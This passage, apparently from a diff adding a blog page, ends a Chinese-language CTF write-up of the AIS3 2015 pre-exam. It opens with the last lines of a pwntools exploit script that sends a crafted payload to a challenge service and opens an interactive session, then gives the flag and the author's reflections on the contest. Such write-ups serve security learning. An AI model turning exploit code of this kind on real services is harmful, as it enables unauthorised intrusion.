class="string">"Enter response: "</span>)</span><br><span class="line">	resp = pass_challenge(seed)</span><br><span class="line">	log.info(<span class="string">"sending resp:"</span> + resp)</span><br><span class="line">	r.sendline(resp)</span><br><span class="line"></span><br><span class="line">	r.recvuntil(<span class="string">"Input your choice: "</span>)</span><br><span class="line">	r.sendline(<span class="string">"2"</span>)</span><br><span class="line">	r.recvuntil(<span class="string">"information: "</span>)</span><br><span class="line">	log.info(<span class="string">"sending payload:"</span> + final_payload)</span><br><span class="line">	r.sendline(final_payload)</span><br><span class="line">	r.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag: <code>AIS3{give_me_mdfive}</code></p>
+<h1 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h1><p>這次的題目大部分都出得很不錯<br>撇開有些題目頗電波不說<br>基本上難度還算適中<br>不管是新的攻擊技巧還是解題思路<br>都從這次的題目裡面學到蠻多東西的</p>
+<p>最後差一題 WEB3 破台, RANK 11<br>其實還蠻可惜的，本來最高衝到第四說<br>主要是第二天晚上看到電視在播不可能的任務4，就放掉耍廢了XD<br>一覺醒來直接掉到十名外，嘖嘖<br>看到同是 BambooFox 的 <a href="http://ddaa.tw/" target="_blank" rel="noopener">ddaa</a>, <a href="http://l4ys.tw/" target="_blank" rel="noopener">Lays</a> 和 <a href="http://angelboy.logdown.com/" target="_blank" rel="noopener">AngelBoy ( malloc )</a> 等人都在第二天相繼破台<br>自己卻還差他們一截，就覺得自己還有許多不足的地方<br>能夠拿來說嘴的頂多就是這次 PWN3D 是第二個 AK 的<br>( 第一天晚上睡覺前看到 PWN3D3 只有 2 個人解應該沒有錯 )</p>
+<p>如何快速學習一個自己不知道的東西真的很重要<br>不管是 WEB 還是其他類型的題目<br>我發現自己還是十分缺乏快速 google + 現學現賣的能力<br>很多時候都找不到合適的關鍵字，導致在解題時常常會卡住，而且一卡就卡很久<br>這都是自己必須要趕快加強，改進的地方<br>想要往更高的境界邁進，勢必得付出更多的努力才行<br>繼續加油，努力學習吧!</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Pwnable/" rel="tag"># Pwnable</a>
+          
+            <a href="/tags/Python/" rel="tag"># Python</a>
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+            <a href="/tags/Misc/" rel="tag"># Misc</a>
+          
+            <a href="/tags/PPC/" rel="tag"># PPC</a>
+          
+            <a href="/tags/Crypto/" rel="tag"># Crypto</a>
+          
+            <a href="/tags/C/" rel="tag"># C</a>
+          
+            <a href="/tags/format-string/" rel="tag"># format_string</a>
+          
+            <a href="/tags/AIS3/" rel="tag"># AIS3</a>
+          
+            <a href="/tags/Reversing/" rel="tag"># Reversing</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/05/23/2015-05-23-defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/" rel="next" title="DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey">
+                <i class="fa fa-chevron-left"></i> DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/09/21/2015-09-21--csaw-ctf-2015-hacking-time/" rel="prev" title="CSAW CTF 2015 -- Hacking Time">
+                CSAW CTF 2015 -- Hacking Time <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80"
+               alt="Bruce Chen" />
+          <p class="site-author-name" itemprop="name">Bruce Chen</p>
+           
+              <p class="site-description motion-element" itemprop="description">Security researcher / CTFer / Pwner</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">50</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">61</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/bruce30262" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/bruce30262" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/bruce.chen.102" target="_blank" title="Facebook">
+                  
+                    <i class="fa fa-fw fa-facebook"></i>
+                  
+                  Facebook
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC1"><span class="nav-number">1.1.</span> <span class="nav-text">MISC1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC2"><span class="nav-number">1.2.</span> <span class="nav-text">MISC2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MISC3"><span class="nav-number">1.3.</span> <span class="nav-text">MISC3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">2.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB1"><span class="nav-number">2.1.</span> <span class="nav-text">WEB1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB2"><span class="nav-number">2.2.</span> <span class="nav-text">WEB2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB3"><span class="nav-number">2.3.</span> <span class="nav-text">WEB3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#BINARY"><span class="nav-number">3.</span> <span class="nav-text">BINARY</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BINARY1"><span class="nav-number">3.1.</span> <span class="nav-text">BINARY1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BINARY2"><span class="nav-number">3.2.</span> <span class="nav-text">BINARY2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BINARY3"><span class="nav-number">3.3.</span> <span class="nav-text">BINARY3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN3D"><span class="nav-number">4.</span> <span class="nav-text">PWN3D</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN3D1"><span class="nav-number">4.1.</span> <span class="nav-text">PWN3D1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN3D2"><span class="nav-number">4.2.</span> <span class="nav-text">PWN3D2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN3D3"><span class="nav-number">4.3.</span> <span class="nav-text">PWN3D3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CRYPTO"><span class="nav-number">5.</span> <span class="nav-text">CRYPTO</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO1"><span class="nav-number">5.1.</span> <span class="nav-text">CRYPTO1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO2"><span class="nav-number">5.2.</span> <span class="nav-text">CRYPTO2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRYPTO3"><span class="nav-number">5.3.</span> <span class="nav-text">CRYPTO3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#心得"><span class="nav-number">6.</span> <span class="nav-text">心得</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce Chen</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      Total visitors
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      Total views
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://bruce30262logdown.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://bruce30262.github.io/2015/08/06/2015-08-06-ais3-2015-pre-exam-complete-writeup/';
+          this.page.identifier = '2015/08/06/2015-08-06-ais3-2015-pre-exam-complete-writeup/';
+          this.page.title = 'AIS3 2015 pre-exam -- complete writeup';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
